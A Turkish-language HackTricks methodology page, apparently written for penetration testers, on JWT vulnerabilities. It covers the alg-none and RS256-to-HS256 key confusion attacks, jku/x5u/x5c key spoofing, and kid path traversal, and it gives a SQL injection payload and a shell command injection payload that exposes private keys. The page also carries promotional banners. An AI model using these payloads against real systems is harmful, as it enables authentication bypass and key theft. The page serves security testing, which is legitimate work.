# JWT GÃ¼venlik AÃ§Ä±klarÄ± (Json Web Token'lar)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hacking kariyeri**ne ilgi duyuyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± ÅŸekilde LehÃ§e yazÄ±lÄ± ve konuÅŸma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

**Bu yazÄ±nÄ±n bir kÄ±smÄ± harika yazÄ±ya dayanmaktadÄ±r:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWT'leri pentest etmek iÃ§in harika bir aracÄ±n yazarÄ±** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **HÄ±zlÄ± KazanÄ±mlar**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)'u `TÃ¼m Testler!` modunda Ã§alÄ±ÅŸtÄ±rÄ±n ve yeÅŸil satÄ±rlarÄ± bekleyin
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
EÄŸer ÅŸanslÄ±ysanÄ±z, araÃ§ JWT'yi yanlÄ±ÅŸ ÅŸekilde kontrol eden web uygulamasÄ±nÄ±n bazÄ± durumlarÄ±nÄ± bulabilir:

![](<../.gitbook/assets/image (932).png>)

Daha sonra, proxy'nizde isteÄŸi arayabilir veya kullanÄ±lan JWT'yi jwt_tool'u kullanarak o istek iÃ§in dump edebilirsiniz:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Veriye hiÃ§bir ÅŸey deÄŸiÅŸtirmeden veriyi deÄŸiÅŸtirin

Sadece veriyi deÄŸiÅŸtirerek imzayÄ± aynÄ± bÄ±rakabilir ve sunucunun imzayÄ± kontrol edip etmediÄŸini kontrol edebilirsiniz. Ã–rneÄŸin, kullanÄ±cÄ± adÄ±nÄ±zÄ± "admin" olarak deÄŸiÅŸtirmeyi deneyin.

#### **Token kontrol ediliyor mu?**

Bir JWT'nin imzasÄ±nÄ±n doÄŸrulandÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in:

* Bir hata mesajÄ± doÄŸrulamanÄ±n devam ettiÄŸini gÃ¶sterir; ayrÄ±ntÄ±lÄ± hatalardaki hassas bilgiler incelenmelidir.
* Geri dÃ¶nen sayfada bir deÄŸiÅŸiklik doÄŸrulamayÄ± gÃ¶sterir.
* Herhangi bir deÄŸiÅŸiklik olmamasÄ± doÄŸrulama olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir; bu durumda veri yÃ¼kÃ¼ iddialarÄ±nÄ± deÄŸiÅŸtirmek iÃ§in denemeler yapÄ±lmalÄ±dÄ±r.

### KÃ¶ken

Token'Ä±n sunucu tarafÄ±ndan mÄ± yoksa istemci tarafÄ±ndan mÄ± oluÅŸturulduÄŸunu belirlemek Ã¶nemlidir, bunu proxy'nin istek geÃ§miÅŸini inceleyerek yapabilirsiniz.

* Ä°lk kez istemci tarafÄ±ndan gÃ¶rÃ¼len token'lar, anahtarÄ±n istemci tarafÄ± koduna maruz kalabileceÄŸini gÃ¶sterir, bu da daha fazla inceleme gerektirir.
* Sunucu tarafÄ±ndan kaynaklanan token'lar gÃ¼venli bir sÃ¼reci iÅŸaret eder.

### SÃ¼re

Token'Ä±n 24 saatten fazla sÃ¼rÃ¼p sÃ¼rmediÄŸini kontrol edin... belki hiÃ§ sÃ¼resi dolmuyordur. "exp" alanÄ± varsa, sunucunun bunu doÄŸru ÅŸekilde iÅŸleyip iÅŸlemediÄŸini kontrol edin.

### HMAC gizli anahtarÄ±nÄ± kaba kuvvetle Ã§Ã¶zme

[**Bu sayfaya bakÄ±n.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### AlgoritmayÄ± None olarak deÄŸiÅŸtirin (CVE-2015-9235)

KullanÄ±lan algoritmayÄ± "None" olarak ayarlayÄ±n ve imza kÄ±smÄ±nÄ± kaldÄ±rÄ±n.

Bu zafiyeti denemek ve JWT iÃ§inde farklÄ± deÄŸerleri deÄŸiÅŸtirmek iÃ§in Burp uzantÄ±sÄ±nÄ± "JSON Web Token" olarak kullanÄ±n (istemi Repeater'a gÃ¶nderin ve "JSON Web Token" sekmesinde token'Ä±n deÄŸerlerini deÄŸiÅŸtirebilirsiniz. AyrÄ±ca "Alg" alanÄ±nÄ±n deÄŸerini "None" olarak seÃ§ebilirsiniz).

### AlgoritmayÄ± RS256(asimetrik) den HS256(simetrik) olarak deÄŸiÅŸtirin (CVE-2016-5431/CVE-2016-10555)

HS256 algoritmasÄ±, her mesajÄ± imzalamak ve doÄŸrulamak iÃ§in gizli anahtarÄ± kullanÄ±r.\
RS256 algoritmasÄ±, mesajÄ± imzalamak iÃ§in Ã¶zel anahtarÄ± kullanÄ±r ve doÄŸrulama iÃ§in genel anahtarÄ± kullanÄ±r.

AlgoritmayÄ± RS256'dan HS256'ya deÄŸiÅŸtirirseniz, arka uÃ§ kodu genel anahtarÄ± gizli anahtar olarak kullanÄ±r ve ardÄ±ndan imzayÄ± doÄŸrulamak iÃ§in HS256 algoritmasÄ±nÄ± kullanÄ±r.

Daha sonra genel anahtarÄ± kullanarak RS256'yÄ± HS256'ya deÄŸiÅŸtirerek geÃ§erli bir imza oluÅŸturabiliriz. Bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in web sunucusunun sertifikasÄ±nÄ± alabilirsiniz.
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### BaÅŸlÄ±k iÃ§inde yeni genel anahtar

Bir saldÄ±rgan, belirtecin baÅŸlÄ±ÄŸÄ±na yeni bir anahtar gÃ¶merek sunucunun bu yeni anahtarÄ± imzayÄ± doÄŸrulamak iÃ§in kullanmasÄ±nÄ± saÄŸlar (CVE-2018-0114).

Bu, "JSON Web Tokens" Burp eklentisi ile yapÄ±labilir.\
(Ä°steÄŸi Repeater'a gÃ¶nderin, JSON Web Token sekmesinde "CVE-2018-0114"Ã¼ seÃ§in ve isteÄŸi gÃ¶nderin).

### JWKS SahteciliÄŸi

Talimatlar, JWT belgelerinin gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in bir yÃ¶ntemi detaylandÄ±rÄ±r, Ã¶zellikle "jku" baÅŸlÄ±ÄŸÄ± iddiasÄ±nÄ± kullananlarÄ±. Bu iddia, belirtecin doÄŸrulamasÄ± iÃ§in gerekli genel anahtarÄ± iÃ§eren bir JWKS (JSON Web Key Set) dosyasÄ±na baÄŸlanmalÄ±dÄ±r.

* **"jku" BaÅŸlÄ±ÄŸÄ± ile Belge DeÄŸerlendirme**:
* "jku" iddiasÄ±nÄ±n URL'sini doÄŸrulayarak, uygun JWKS dosyasÄ±na yÃ¶nlendirdiÄŸinden emin olun.
* Belgenin "jku" deÄŸerini deÄŸiÅŸtirerek, trafiÄŸi gÃ¶zlemlemeye izin veren kontrol edilen bir web hizmetine yÃ¶nlendirin.
* **HTTP EtkileÅŸimi Ä°Ã§in Ä°zleme**:
* Belirtilen URL'ye yapÄ±lan HTTP isteklerini gÃ¶zlemlemek, sunucunun saÄŸladÄ±ÄŸÄ±nÄ±z baÄŸlantÄ±dan anahtarlarÄ± almaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶sterir.
* Bu iÅŸlem iÃ§in `jwt_tool` kullanÄ±rken, testi kolaylaÅŸtÄ±rmak iÃ§in `jwtconf.ini` dosyasÄ±nÄ± kiÅŸisel JWKS konumunuzla gÃ¼ncellemek Ã¶nemlidir.
* **`jwt_tool` iÃ§in Komut**:
*   AÅŸaÄŸÄ±daki komutu kullanarak `jwt_tool` ile senaryoyu simÃ¼le edin:

```bash
python3 jwt_tool.py JWT_BURAYA -X s
```

### Kid SorunlarÄ± Genel BakÄ±ÅŸ

`kid` olarak bilinen isteÄŸe baÄŸlÄ± bir baÅŸlÄ±k iddiasÄ±, belirtecin imza doÄŸrulamasÄ± iÃ§in birden fazla anahtarÄ±n bulunduÄŸu ortamlarda Ã¶zellikle Ã¶nemli hale gelir. Bu iddia, belirtecin imzasÄ±nÄ± doÄŸrulamak iÃ§in uygun anahtarÄ± seÃ§mede yardÄ±mcÄ± olur.

#### "kid" ile AnahtarÄ± AÃ§Ä±ÄŸa Ã‡Ä±karma

BaÅŸlÄ±kta `kid` iddiasÄ± bulunduÄŸunda, ilgili dosyayÄ± veya varyasyonlarÄ±nÄ± aramak iÃ§in web dizininde arama yapÄ±lmasÄ± Ã¶nerilir. Ã–rneÄŸin, `"kid":"anahtar/12345"` belirtilmiÅŸse, _/anahtar/12345_ ve _/anahtar/12345.pem_ dosyalarÄ± web kÃ¶kÃ¼nde aranmalÄ±dÄ±r.

#### "kid" ile Yol GeÃ§iÅŸi

`kid` iddiasÄ±, dosya sistemi Ã¼zerinde gezinmek iÃ§in kullanÄ±labilir ve bu, keyfi bir dosyanÄ±n seÃ§ilmesine izin verebilir. Belirli dosyalarÄ± veya hizmetleri hedeflemek iÃ§in `kid` deÄŸerini deÄŸiÅŸtirerek baÄŸlantÄ±yÄ± test etmek veya Sunucu TarafÄ± Ä°stek SahteciliÄŸi (SSRF) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. JWT'yi deÄŸiÅŸtirmek iÃ§in `jwt_tool`da `-T` bayraÄŸÄ±nÄ± kullanarak orijinal imzayÄ± korurken `kid` deÄŸerini deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Hedeflenen dosyalarÄ±n tahmin edilebilir iÃ§eriÄŸi ile, geÃ§erli bir JWT oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, Linux sistemlerindeki `/proc/sys/kernel/randomize_va_space` dosyasÄ±, iÃ§erdiÄŸi **2** deÄŸeri ile `kid` parametresinde **2** olarak simetrik ÅŸifre olarak JWT oluÅŸturmak iÃ§in kullanÄ±labilir.

#### "kid" Ãœzerinden SQL Enjeksiyonu

EÄŸer `kid` iddiasÄ±nÄ±n iÃ§eriÄŸi bir veritabanÄ±ndan bir ÅŸifre almak iÃ§in kullanÄ±lÄ±yorsa, `kid` yÃ¼kÃ¼nÃ¼ deÄŸiÅŸtirerek SQL enjeksiyonu kolaylaÅŸtÄ±rÄ±labilir. JWT imzalama sÃ¼recini deÄŸiÅŸtirmek iÃ§in SQL enjeksiyonu kullanan bir Ã¶rnek yÃ¼k ÅŸunlarÄ± iÃ§erir:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Bu deÄŸiÅŸiklik, JWT imzalama iÃ§in bilinen gizli anahtar olan `ATTACKER`'Ä±n kullanÄ±lmasÄ±nÄ± zorlar.

#### "kid" Ãœzerinden OS Enjeksiyonu

`kid` parametresinin bir komut yÃ¼rÃ¼tme baÄŸlamÄ±nda kullanÄ±lan bir dosya yolunu belirttiÄŸi bir senaryo, Uzaktan Kod YÃ¼rÃ¼tme (RCE) gÃ¼venlik aÃ§Ä±klarÄ±na yol aÃ§abilir. `kid` parametresine komutlar enjekte edilerek, Ã¶zel anahtarlar aÃ§Ä±ÄŸa Ã§Ä±karÄ±labilir. RCE ve anahtarÄ±n aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmasÄ± iÃ§in bir Ã¶rnek yÃ¼k ÅŸudur:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u ve jku

#### jku

jku, **JWK Set URL**'nin kÄ±saltmasÄ±dÄ±r.\
EÄŸer token bir "**jku**" **Header** iddiasÄ± kullanÄ±yorsa, **saÄŸlanan URL'yi kontrol edin**. Bu, belirtilen URL'yi iÃ§eren JWKS dosyasÄ±nÄ± iÅŸaret etmelidir ki bu dosya, token'Ä± doÄŸrulamak iÃ§in kullanÄ±lan Genel AnahtarÄ± iÃ§ermelidir. Trafik izleyebileceÄŸiniz bir web hizmetine jku deÄŸerini iÅŸaret edecek ÅŸekilde token'Ä± deÄŸiÅŸtirin.

Ä°lk olarak, yeni Ã¶zel ve genel anahtarlarla yeni bir sertifika oluÅŸturmanÄ±z gerekmektedir.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Sonra Ã¶rneÄŸin [**jwt.io**](https://jwt.io) kullanarak **oluÅŸturulan genel ve Ã¶zel anahtarlarla yeni JWT oluÅŸturabilir ve jku parametresini oluÅŸturulan sertifikaya iÅŸaret edecek ÅŸekilde ayarlayabilirsiniz.** GeÃ§erli bir jku sertifikasÄ± oluÅŸturmak iÃ§in orijinalini indirebilir ve gerekli parametreleri deÄŸiÅŸtirebilirsiniz.

"e" ve "n" parametrelerini bir genel sertifikadan ÅŸu ÅŸekilde alabilirsiniz:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. PEM formunda kodlanmÄ±ÅŸ X.509 (bir sertifika format standardÄ±) genel sertifikalar kÃ¼mesine iÅŸaret eden bir URI. KÃ¼medeki ilk sertifika bu JWT'yi imzalamak iÃ§in kullanÄ±lan sertifikadÄ±r. ArdÄ±ÅŸÄ±k sertifikalar birbirini imzalar, bÃ¶ylece sertifika zinciri tamamlanmÄ±ÅŸ olur. X.509, RFC 5280'de tanÄ±mlanmÄ±ÅŸtÄ±r. SertifikalarÄ±n transfer edilmesi iÃ§in taÅŸÄ±ma gÃ¼venliÄŸi gereklidir.

Bu baÅŸlÄ±ÄŸÄ± **kendi kontrolÃ¼nÃ¼zdeki bir URL'ye deÄŸiÅŸtirmeyi deneyin** ve herhangi bir isteÄŸin alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± kontrol edin. Bu durumda JWT'yi **manipÃ¼le edebilirsiniz**.

Kendi kontrolÃ¼nÃ¼zdeki bir sertifikayÄ± kullanarak yeni bir belirteÃ§ oluÅŸturmak iÃ§in, sertifikayÄ± oluÅŸturmanÄ±z ve genel ve Ã¶zel anahtarlarÄ± Ã§Ä±karmanÄ±z gerekmektedir:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Sonra Ã¶rneÄŸin [**jwt.io**](https://jwt.io) kullanabilirsiniz ve **oluÅŸturulan genel ve Ã¶zel anahtarlarla yeni JWT'yi oluÅŸturabilir ve x5u parametresini .crt uzantÄ±lÄ± sertifikaya iÅŸaret edecek ÅŸekilde ayarlayabilirsiniz.**

![](<../.gitbook/assets/image (953).png>)

AyrÄ±ca bu zafiyetleri **SSRF'ler iÃ§in kÃ¶tÃ¼ye kullanabilirsiniz**.

#### x5c

Bu parametre **base64 formatÄ±nda sertifikayÄ±** iÃ§erebilir:

![](<../.gitbook/assets/image (1116).png>)

SaldÄ±rgan, **kendi kendine imzalÄ± bir sertifika oluÅŸturur** ve ilgili Ã¶zel anahtarÄ± kullanarak sahte bir belge oluÅŸturur ve "x5c" parametresinin deÄŸerini yeni oluÅŸturulan sertifikayla deÄŸiÅŸtirir ve diÄŸer parametreleri, yani n, e ve x5t'yi deÄŸiÅŸtirirse, aslÄ±nda sahte belge sunucu tarafÄ±ndan kabul edilir hale gelir.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### GÃ¶mÃ¼lÃ¼ Genel Anahtar (CVE-2018-0114)

EÄŸer JWT aÅŸaÄŸÄ±daki senaryoda olduÄŸu gibi bir genel anahtarÄ± gÃ¶mÃ¼lÃ¼yse:

![](<../.gitbook/assets/image (619).png>)

O verilerden bir genel anahtar oluÅŸturmak iÃ§in aÅŸaÄŸÄ±daki nodejs betiÄŸi kullanÄ±labilir:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Yeni bir Ã¶zel/genel anahtar oluÅŸturmak, yeni genel anahtarÄ± belirteci iÃ§ine gÃ¶mmek ve bunu kullanarak yeni bir imza oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Bu Node.js betiÄŸi kullanarak "n" ve "e" deÄŸerlerini elde edebilirsiniz:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: AynÄ± nonce ile Ã¶zel anahtarÄ± ifÅŸa etme

BazÄ± uygulamalar ES256 kullanÄ±yorsa ve iki JWT oluÅŸturmak iÃ§in aynÄ± nonce'u kullanÄ±yorsa, Ã¶zel anahtar geri getirilebilir.

Ä°ÅŸte bir Ã¶rnek: [ECDSA: AynÄ± nonce kullanÄ±ldÄ±ÄŸÄ±nda Ã¶zel anahtarÄ± ifÅŸa etme (SECP256k1 ile)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT KimliÄŸi)

JTI (JWT KimliÄŸi) iddiasÄ±, bir JWT Jetonu iÃ§in benzersiz bir tanÄ±mlayÄ±cÄ± saÄŸlar. Jetonun tekrarlanmasÄ±nÄ± Ã¶nlemek iÃ§in kullanÄ±labilir. Ancak, ID'nin maksimum uzunluÄŸunun 4 (0001-9999) olduÄŸu bir durumu hayal edin. Ä°stek 0001 ve 10001 aynÄ± kimliÄŸi kullanacak. Bu nedenle, backend her istekte kimliÄŸi artÄ±rÄ±yorsa, bu durumu istek arasÄ±nda 10000 istek gÃ¶ndererek **bir isteÄŸi tekrar oynatmak** iÃ§in kÃ¶tÃ¼ye kullanabilirsiniz.

### JWT KayÄ±tlÄ± iddialarÄ±

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### DiÄŸer saldÄ±rÄ±lar

**Ã‡apraz-servis RÃ¶le SaldÄ±rÄ±larÄ±**

BazÄ± web uygulamalarÄ±nÄ±n, jetonlarÄ±nÄ±n oluÅŸturulmasÄ± ve yÃ¶netimi iÃ§in gÃ¼venilir bir JWT hizmetine gÃ¼vendiÄŸi gÃ¶zlemlenmiÅŸtir. Bir JWT hizmeti tarafÄ±ndan bir istemci iÃ§in oluÅŸturulan bir jetonun, aynÄ± JWT hizmetinin baÅŸka bir istemcisi tarafÄ±ndan kabul edildiÄŸi kaydedilmiÅŸtir. ÃœÃ§Ã¼ncÃ¼ taraf bir hizmet aracÄ±lÄ±ÄŸÄ±yla bir JWT'nin verilmesi veya yenilenmesi gÃ¶zlemlenirse, aynÄ± kullanÄ±cÄ± adÄ±/e-posta ile baÅŸka bir hizmetin istemcisine hesap oluÅŸturulmasÄ± olasÄ±lÄ±ÄŸÄ± araÅŸtÄ±rÄ±lmalÄ±dÄ±r. Daha sonra elde edilen jetonun hedefe bir istekte tekrarlanÄ±p tekrarlanmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in bir deneme yapÄ±lmalÄ±dÄ±r.

* Jetonunuzun kabul edilmesi ciddi bir sorunu iÅŸaret edebilir ve herhangi bir kullanÄ±cÄ±nÄ±n hesabÄ±nÄ±n sahteciliÄŸine izin verebilir. Ancak, bu, Ã¼Ã§Ã¼ncÃ¼ taraf bir uygulamaya kaydolmanÄ±n yasal bir gri alana girebileceÄŸi iÃ§in daha geniÅŸ testler iÃ§in izin alÄ±nmasÄ± gerekebileceÄŸini unutmamak Ã¶nemlidir.

**JetonlarÄ±n SÃ¼resi Kontrol Edilmesi**

Jetonun sÃ¼resi, "exp" YÃ¼k iddiasÄ± kullanÄ±larak kontrol edilir. JWT'ler genellikle oturum bilgisi olmadan kullanÄ±ldÄ±ÄŸÄ±ndan, dikkatli bir iÅŸlem gereklidir. BirÃ§ok durumda, baÅŸka bir kullanÄ±cÄ±nÄ±n JWT'sini yakalayÄ±p tekrar oynatmak, o kullanÄ±cÄ±nÄ±n taklit edilmesine olanak tanÄ±yabilir. JWT RFC'si, JWT tekrar oynatma saldÄ±rÄ±larÄ±nÄ± azaltmak iÃ§in jetona bir sÃ¼re belirlemek iÃ§in "exp" iddiasÄ±nÄ± kullanmayÄ± Ã¶nerir. AyrÄ±ca, uygulamanÄ±n bu deÄŸerin iÅŸlenmesini ve sÃ¼resi geÃ§miÅŸ jetonlarÄ±n reddedilmesini saÄŸlamak iÃ§in ilgili kontrolleri uygulamasÄ± Ã¶nemlidir. Jetonun "exp" iddiasÄ±nÄ± iÃ§eriyorsa ve test sÃ¼releri izin veriyorsa, jetonun saklanmasÄ± ve sÃ¼resi geÃ§tikten sonra tekrar oynatÄ±lmasÄ± tavsiye edilir. Jetonun iÃ§eriÄŸi, jet\_tool'un -R bayraÄŸÄ±nÄ± kullanarak okunabilir, zaman damgasÄ± ayrÄ±ÅŸtÄ±rma ve sÃ¼re kontrolÃ¼ (UTC'de zaman damgasÄ±) gibi.

* UygulamanÄ±n hala jetonu doÄŸrulamasÄ± durumunda bir gÃ¼venlik riski olabilir, Ã§Ã¼nkÃ¼ bu, jetonun asla sÃ¼resinin dolmayacaÄŸÄ± anlamÄ±na gelebilir.

### AraÃ§lar

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hacking kariyeri**ne ilgi duyuyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± ÅŸekilde yazÄ±lÄ± ve konuÅŸulan LehÃ§e gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Discord grubuna** ğŸ’¬ [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek destekleyin.

</details>
